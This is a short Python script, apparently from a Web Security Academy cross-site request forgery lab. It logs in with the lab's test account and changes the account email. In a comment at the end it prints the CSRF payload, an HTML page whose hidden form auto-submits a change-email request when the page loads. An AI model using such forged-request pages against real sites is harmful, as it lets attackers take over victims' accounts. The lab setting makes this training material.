#!/usr/bin/python3

import requests
import sys

def changeEmail(url, api_login, api_changeEmail, email):

    data = {
        "username": "wiener",
        "password": "peter",
    }

    s = requests.Session()
    r = s.post(url + api_login, data=data)
    #print(r.status_code)

    if r.status_code == 200:
        print("[INFO] Login successful!")

        data = {
            "email": email,
        }

        r = s.post(url + api_changeEmail, data=data)
        #print(r.status_code)
        if r.status_code == 200:
            print(f"[INFO] Email changed to: {email}")
        else:
            print("[INFO] Something went wrong!")
            sys.exit(1)
    else: 
        print("[INFO] Something went wrong!")
        sys.exit(1)


if __name__ == '__main__':
    url = "https://acf11f4d1eab157fc00c22d200de00be.web-security-academy.net"
    api_login = "/login"
    api_changeEmail = "/my-account/change-email"
    email = sys.argv[1]

    changeEmail(url, api_login, api_changeEmail, email)


# Payload Used

# <html>
#   <body>
#     <form action="https://acf11f4d1eab157fc00c22d200de00be.web-security-academy.net/my-account/change-email" method="POST">
#       <input type="hidden" name="email" value="bigb0ss.bad@gmail.com" />
#     </form>
#     <script>
#       document.forms[0].submit();
#     </script>
#   </body>
# </html>